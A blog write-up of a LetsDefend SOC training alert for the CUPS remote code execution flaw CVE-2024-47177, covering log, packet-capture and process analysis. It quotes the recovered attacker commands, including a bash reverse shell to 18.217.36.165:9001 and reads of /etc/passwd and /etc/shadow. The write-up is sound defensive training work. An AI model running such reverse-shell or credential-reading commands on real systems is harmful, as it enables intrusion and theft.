---
author: "Jacob Kollasch"
title: "CUPS RCE Detection via IPP Injection (CVE-2024-47177)"
date: 2024-10-16T12:00:08+00:00
description: "LetsDefend alert SOC329 writeup, and technical breakdown of CVE-2024-47177."
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: Jacob Kollasch
authorEmoji: Written by
pinned: false
tags: 
- hugo
- github
- netlify
---
## Intro
Today we are looking at this new critical alert on LetsDefend that is simulating the recently discovered linux CUPS RCE vuln. Also known as (CVE-2024-47177). This should be a fun one because I can remember reading about it for the first time about 2 weeks ago. I was playing around with otx.alienvault.com threat intelligence feed, and saw an interesting post about a new linux vulnerability. https://otx.alienvault.com/pulse/66f79d146f77699c76532842. 

This post linked to the original writeup on https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/. Then later that week it was also discussed on Paul's Security Weekly Episode 845 https://www.scworld.com/podcast-segment/13202-nothing-is-safe-psw-845. Fantastic podcast if you aren't familiar. 

I love to see that LetsDefend took this vulnerability and turned into an alert so quickly. Time to put some learning into practice. First, let's share some background on this CVE and anything CUPS related that you need to know to understand this attack, and properly respond to this alert. 

## Explaining CVE-2024-47177
### NIST Awaiting Analysis
Normally I like to search the CVE if it's contained it the alert, and will check NIST first. However, this CVE is reported as "Awaiting Analysis" at time of writing. This reminds me of more recent episode of PSW (#846) where they were discussing the sheer number of CVE's reported every year (~30,000 so far in 2024), but only ~12,000 have been analyzed. Well that's pretty remarkable to have analyzed so many clearly there are more CVE's reported than can ever by addressed. There has to be some priority to what they choose, but still you wonder what could slip through the cracks. Here is the dashboard discussed. 
https://nvd.nist.gov/general/nvd-dashboard. 

Still, we get a brief description of the CVE.
![[Pasted image 20241012114907.png]]
Sounds like a lack of input sanizitation leading to remote code execution, but it's vague as usual.
### EvilSocket Writeup Deep-Dive
#### Disclosure Battle
This article was written by the researcher who found this vulnerability and reported to the cups software maintainers. They experienced quite the headache in the disclosure process facing lots of push back from devs. I bring that up to highlight the difficulties of ethical disclosure. The researcher states they only wanted to help, but were met with an adversarial spirit from the devs. They even mention this might stop them from disclosure in the future. 

Isn't this how open source software is supposed to work? Instead it's a nightmare of ego battles and diminishing of risk. 

#### Risk
ADD
- Details about what linux distros are actually vulnerable
	- Do linux server distros come with this enabled by default? Most servers don't print. Ubutnu desktop has this.
- Port needs to be reachabel from the internet
	- NAT and properly configured firewall will rule this out.
	- Web servers, commonly haning out on the intetnet, but are they vulnerable?
- Someone needs to run print job, so system needs to actually be used to print
	- How many commands will this allow you run
	
ES goes onto say this attack is vulnerable from the internet and locally, and affects most GNU/Linux distros. That sounds really bad. Most GNU/linux distros are vulnerable to RCE from the internet?????

However, in order to be vulnerable from the internet the UDP port 631 needs to forwarded to the internet by your router/firewall. This is not default behavior. You need to explicitly tell your router/firewall to forward connections on UDP/631 to the vulnerable host. Or the server is directly hosted on the internet, say like a web server. Even with a web server though is it going to have printer services enabled to enable this attack? It sounds like ubuntu desktop has this service enabled by default, but server versions of ubuntu do not. 

I am not trying to downplay the impact, but want to point out every linux server in the world isn't about to get hit simply because they have internet connectivity. The researcher isn't trying to say that's the case either I just wanted to point it out. 

It's still very serious with ES claiming their scanning has yielded hundreds of thousands of vulnerable hosts on the internet at the time of writing.

### Exploit High Level
`CUPS` is a printing service found on most GNU/Linux distros, `cups-browsed` is a part of `CUPS` software that accepts connection from any IP address on UDP/631. 

TA's setup a IPP/IPPs print server on their own infrastructure.

TA's sends crafted UDP packet to target telling it about the new printer on TA's infra. This causes `cups-browsd` service to contact the IPP/IPPs url and retrieve the new printers attributes.

The printer attributes contain the code the TA wants to run on victim system. Proper input sanitization is not performed on pritner attributes.

When a print job is executed on the system the attacker commands are executed on the system as `Ip` user that CUPS service runs under. `Ip` user does not have elevated privileges by default.

### Attack Surface
Local - mDNS can be abused to register a new printer or replace PPD file on existing. 
Local/WAN - UDP/631 can be abused to register a new printer with bad PPD file from any ip address. This would include reachability over the internet if a firewall configuration exposes this port to the internet. Additionally, if NAT is configured properly this attack is not possible over the internet.  

## Alert Analysis
### Why was this alert triggered?
Activity related to the CUPS RCE (CVE-2024-47177) exploit was detected on one of our systems. IPP requests were made to UDP/631 on target which is a sign of this CVE being exploited.

IPP request was made from public IP address indicating attack from the internet might be taking place causing our victim machine to reach out to the attackers infrastructure to receive commands to be executed.

### Data Collection
Let's start by looking at logs related to cups service on our host that is being targeted. Heading over to `endpoint security` section to log onto the host.

`/var/log/cups` seems like a good place to look. We see numerous `access-log` files. Not sure why so many gzipped versions. Maybe they are archived log files?  
```
root@ip-172-31-16-191:~# ls -lath /var/log/cups/
total 40K
-rw-r-----  1 root adm     448 Oct 14 16:46 access_log
drwxrwxr-x 17 root syslog 4.0K Oct 14 16:46 ..
drwxr-xr-x  2 root root   4.0K Oct 14 16:46 .
-rw-r-----  1 root adm    3.2K Oct  4 12:17 access_log.1
-rw-r-----  1 root adm     189 Sep 25 14:06 access_log.2.gz
-rw-r-----  1 root adm     188 Jul 17 06:53 access_log.3.gz
-rw-r-----  1 root adm     243 Mar 25  2024 access_log.4.gz
-rw-r-----  1 root adm     230 Feb 20  2024 access_log.5.gz
-rw-r-----  1 root adm     190 Jan 10  2024 access_log.6.gz
-rw-r-----  1 root adm     178 Jan  5  2024 access_log.7.gz
```

Looking at `access_log` we see log entries for a new printer subscriptions around 2 hrs after our alert was triggered. I don't think that is related to the attack. Given it's so far after the alert was triggered. Let's move on to `access_log.1`.
```
root@ip-172-31-16-191:~# cat /var/log/cups/access_log
localhost - - [14/Oct/2024:16:46:34 +0000] "POST / HTTP/1.1" 200 346 Create-Printer-Subscriptions successful-ok
localhost - - [14/Oct/2024:16:46:34 +0000] "POST / HTTP/1.1" 200 173 Create-Printer-Subscriptions successful-ok
localhost - - [14/Oct/2024:16:46:43 +0000] "POST / HTTP/1.1" 200 357 Create-Printer-Subscriptions successful-ok
localhost - - [14/Oct/2024:16:46:47 +0000] "POST / HTTP/1.1" 200 356 Create-Printer-Subscriptions successful-ok
```

```
root@ip-172-31-23-89:/var/spool/cups/tmp# cat /var/log/cups/access_log.1
localhost - - [04/Oct/2024:09:41:40 +0000] "POST / HTTP/1.1" 200 346 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:09:41:40 +0000] "POST / HTTP/1.1" 200 173 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:09:41:48 +0000] "POST / HTTP/1.1" 200 357 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:09:41:52 +0000] "POST / HTTP/1.1" 200 356 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:09:56:01 +0000] "POST / HTTP/1.1" 401 120 Cancel-Subscription successful-ok
localhost - root [04/Oct/2024:09:56:01 +0000] "POST / HTTP/1.1" 200 120 Cancel-Subscription successful-ok
localhost - - [04/Oct/2024:09:56:01 +0000] "POST / HTTP/1.1" 200 149 Cancel-Subscription successful-ok
localhost - - [04/Oct/2024:11:59:35 +0000] "POST / HTTP/1.1" 200 346 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:11:59:35 +0000] "POST / HTTP/1.1" 200 173 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:11:59:44 +0000] "POST / HTTP/1.1" 200 357 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:11:59:48 +0000] "POST / HTTP/1.1" 200 356 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:12:11:31 +0000] "POST /admin/ HTTP/1.1" 401 5407 CUPS-Add-Modify-Printer successful-ok
localhost - root [04/Oct/2024:12:11:31 +0000] "POST /admin/ HTTP/1.1" 200 5407 CUPS-Add-Modify-Printer successful-ok
localhost - - [04/Oct/2024:12:11:56 +0000] "POST / HTTP/1.1" 200 341 Create-Printer-Subscriptions successful-ok
localhost - - [04/Oct/2024:12:12:02 +0000] "POST / HTTP/1.1" 200 149 Cancel-Subscription successful-ok
localhost - - [04/Oct/2024:12:12:02 +0000] "POST / HTTP/1.1" 200 149 Cancel-Subscription client-error-not-found
localhost - - [04/Oct/2024:12:12:34 +0000] "POST /printers/NEW_COLOR_PRINTER_3000_18_217_36_165 HTTP/1.1" 200 5998725 Print-Job successful-ok
localhost - root [04/Oct/2024:12:12:34 +0000] "POST /admin/ HTTP/1.1" 200 269 CUPS-Add-Modify-Printer successful-ok
localhost - root [04/Oct/2024:12:16:32 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:16:42 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:16:52 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:17:02 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:17:12 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:17:22 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:17:32 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - - [04/Oct/2024:12:17:36 +0000] "POST / HTTP/1.1" 200 148 Cancel-Subscription successful-ok
localhost - root [04/Oct/2024:12:17:36 +0000] "POST /admin/ HTTP/1.1" 200 219 Pause-Printer successful-ok
localhost - root [04/Oct/2024:12:17:36 +0000] "POST / HTTP/1.1" 200 120 Cancel-Subscription successful-ok
localhost - - [04/Oct/2024:12:17:36 +0000] "POST / HTTP/1.1" 200 149 Cancel-Subscription successful-ok
```

Here in `access_log.1` we can see at `04/Oct/2024:12:11`, the same time as our alert was triggered, we have a `CUPS-Add-Modify-Printer successful-ok` message, but it recieved a 401 - unauthorized message.  
```
localhost - - [04/Oct/2024:12:11:31 +0000] "POST /admin/ HTTP/1.1" 401 5407 CUPS-Add-Modify-Printer successful-ok
```

However, the next attempt recieves a 200 and appears successful, and is run as root. This log message seems to indicate the TA was successfully able to add their servce.
```
localhost - root [04/Oct/2024:12:11:31 +0000] "POST /admin/ HTTP/1.1" 200 5407 CUPS-Add-Modify-Printer successful-ok
```

Then, we see a log message that looks a print job was made to the TA's printer `NEW_COLOR_PRINTER_3000_18_217_36_165`. I am fairly certain this is the TA's added printer because the name `NEW_COLOR_PRINTER_3000` is appended with the attackers IP address. Which means they might have been able to execute a command right here. I am not able to determine what command was run at this point.
```
localhost - - [04/Oct/2024:12:12:34 +0000] "POST /printers/NEW_COLOR_PRINTER_3000_18_217_36_165 HTTP/1.1" 200 5998725 Print-Job successful-ok
```

Not a good sign. Let's look at the packet capture on the desktop that we were told about in our alert. I want to see all traffic from our attackers IP address and anything with UDP/631. So I open up the pcap and drop this filter. `ip.addr == 18.217.36.165 && udp.port == 631`. This leaves with one packet that shows us exaclty when the TA sent a UDP packet to our server causing it to add TA's malicious print server found at `http://18.217.36.165:4001/printers/PWN`. Given the `PWN` directory and location `You Have Been H4ck3d` we are sure this is malicious.
![[Pasted image 20241014121458.png]]

Here we can wee when the name of the printer they added was `NEW COLOR PRINTER` that checks out with the log message we saw in `/var/log/cups/access_log.1`. I'm assuming the log message appended the IP address that the printer can be found at.

#### Recap so far
A TA has successfully sent a request to our server causing it to add the attackers "printer" which contains malicious attributes that could lead to RCE. We have verified this by looking at CUPS logs on the targeted system, and by analyzing network traffic contained in PCAP file.

We also have logs to show print job was run after malicious printer was added indicating RCE may have taken place. We don't know what commands were run by TA at this point.

### More Endpoint Analysis
#### Endpoint Network Action
Back to `Endpoint Security` on letsdefend let's look at `Netowrk Action` section. Here we can see the targeted server has connected to our attackers IP address 3 times within minutes from the time of alert. I don't know exactly how these three connections were triggered, or what happened. However, it is further proof this attack has been successful.
![[Pasted image 20241014125109.png]]

#### Endpoint Processes
Looking at the `Processes` tab next, I noticed the process `foomatic-rip` to be revealing the actual commands the attacker is running using this exploit. I remember from reading the original wirteup by Evil Socket that `foomatic-rip` is the component of cups that is being abused to achieve RCE because of it's lack of input sanitization. `foomatic-rip` also has a prent procces of `cups` indicating it's a result of the cups service.

I am seeing the `command line` entry containing information for a print job, but the `target proccess command line`, aka the process spawned from our foomatic-rip parent process, is showing malicious commands from the attacker.  I noticed 4 entries from `foomatic-rip` process. 3 of them seem to be run by the attacker, and 1 appears to be legitimately a result of a user printing a file.
![[Pasted image 20241014143931.png]]
![[Pasted image 20241014145307.png]]
The first `target proccess command line` appears to be TA generated and is using a tool called GohstScript to generate a PDF file called  d00001-001. If I try to read that file from terminal I get a bunch of random symbols. I tired a simple base64 decode with no luck. If I open file from GUI even after chmod'ing read access for all I get a file permissions error when trying to open. I'm not 100% sure, but again I think this is testing access... Here is the whole thing.
```
sh -c gs -dNODISPLAY -dNOSAFER -dNOPAUSE -q -c '/pdffile (/var/spool/cups/d00001-001) (r) file runpdfbegin (PageCount: ) print pdfpagecount = quit'
```

Next, I see what appears to be the actual print job because this target process command line value matches the orginal command line value and it is the content of a print job.
```
' /bin/sh -e -c pdftops '1' 'root' '10 Important Sales Analysis Reports + 4 Sales Report Templates' '1' ' job-originating-user-name=root Collate PageSize=Letter Duplex=None job-priority=50 job-uuid=urn:uuid:f718709f-495a-37d0-6e01-b120fdc4da30 cups-browsed job-originating-host-name=localhost date-time-at-creation= date-time-at-processing= time-at-creation=1728043954 time-at-processing=1728043954 job-impressions-completed=0' '/var/spool/cups/d00001-001'
```

Next, we have another ghostscript command that is printing hello to `/dev/null`. I assume the TA had a way of verifying if that was successful as they sent output to the bit bucket to hid their tracks.
```
sh -c gs -dQUIET -dSAFER -dNOPAUSE -dBATCH -dNOMEDIAATTRS -sDEVICE=ps2write -sstdout=%stderr -sOutputFile=/dev/null -c '(hello) print flush' 2>&1
```

Lastly, we can see their efforts to create a reverse shell. Interestingly, this is the only process of `foomatic-rip` that has a parent process of `foomatic-rip` instead of `cups`.
```
/bin/sh -e -c nohup bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"&
```

All of these command executions seem to be triggered when someone tried to print a document called "Important Sales Analysis Reports". Given the logs have identical values `date-time-at-processing= time-at-creation` I assume one print job kicked off all commands.

### Endpoint Terminal History
Switching over to terminal history section we can confirm the reverse shell worked, and what commands the TA ran after getting a shell on their system.
![[Pasted image 20241014150651.png]]
Here are all the commands including starting with the ghostscript test commands.
```
Oct 4 2024 12:12:34 - sh -c gs -dNODISPLAY -dNOSAFER -dNOPAUSE -q -c '/pdf..
Oct 4 2024 12:12:36 - /bin/sh -e -c pdftops '1' 'root' '10 Important Sales Analysis Reports + 4 Sales Report Templates' '1' 'job-originating-user-name=root Collate PageSize=Letter Duplex=None job-priority=50 job-uuid=urn:uuid:f718709f-495a-37d0-6e01-b120fdc4da30 cups-browsed job-originating-host-name=localhost date-time-at-creation= date-time-at-processing= time-at-creation=1728043954 time-at-processing=1728043954 job-impressions-completed=0' '/var/spool/cups/d00001-001'
Oct 4 2024 12:12:39 - sh -c gs -dQUIET -dSAFER -dNOPAUSE -dBATCH -dNOMEDIAATTRS -sDEVICE=ps2write -sstdout=%stderr -sOutputFile=/dev/null -c '(hello) print flush' 2>&1
Oct 4 2024 12:12:39 - /bin/sh -e -c nohup bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"&
Oct 4 2024 12:12:39 - /bin/sh -e -c nohup bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"&
Oct 4 2024 12:12:40 - bash -c bash -i >& /dev/tcp/18.217.36.165/9001 0>&1

# After TA recieved reverse shell
Oct 4 2024 12:12:43 - whoami
Oct 4 2024 12:12:51 - whoami /priv
Oct 4 2024 12:12:59 - ls
Oct 4 2024 12:13:38 - sudo su
Oct 4 2024 12:13:49 - cat /etc/passwd
Oct 4 2024 12:13:59 - cat /etc/shadow
```

#### Endpoint Containment
At this point we need to **contain this endpoint** to prevent further actions from the TA.

## Lessons Learned
### Talk about how CVE was discovered by reading the source code
### Talk about this wasn't known to be exploited in the wild, but do we have evidence of it getting exploited after publish of write-up?
### How did the cyber attack happen?  
TA leveraged (CVE-2024-47177) in order to achieve RCE on vulnerable linux host. Port 631/UDP on target endpoint was exposed to the internet allowing TA to send CUPS protocol message to target causing the attackers salacious print server to be added as a printing device. The parameters in TA's malicious print service contained commands to be run on target system. They were able to execute a reverse shell using RCE achieved from vulnerable CUPs. After receiving a shell the attacker continued to run discovery commands on the the target endpoint.

### What corrective actions can prevent similar incidents in the future?  
If we assume that our fake letsdefend org already knew about this CVE given we had an alert for it, then we should have taken remediation steps at that time on vulnerable hosts in our network. If no patch, we still could have made sure port 631/UDP wasn't reachable on the internet, taken steps to remove the service from hosts who didn't really need CUPS printing services, and create a process for enabling these services when needed as it's probably rare someone has to print from linux at our fake letsdefend company.

Once a patch was available, systems should have been patched.

SOC or security team could have done proactive scanning while waiting for resource owners to remidate and discover if they are vulnerable.

## IOC's
18.217.36.165 - Attempted to exploit CUPS RCE (CVE-2024-47177)
![[Pasted image 20241014165732.png]]

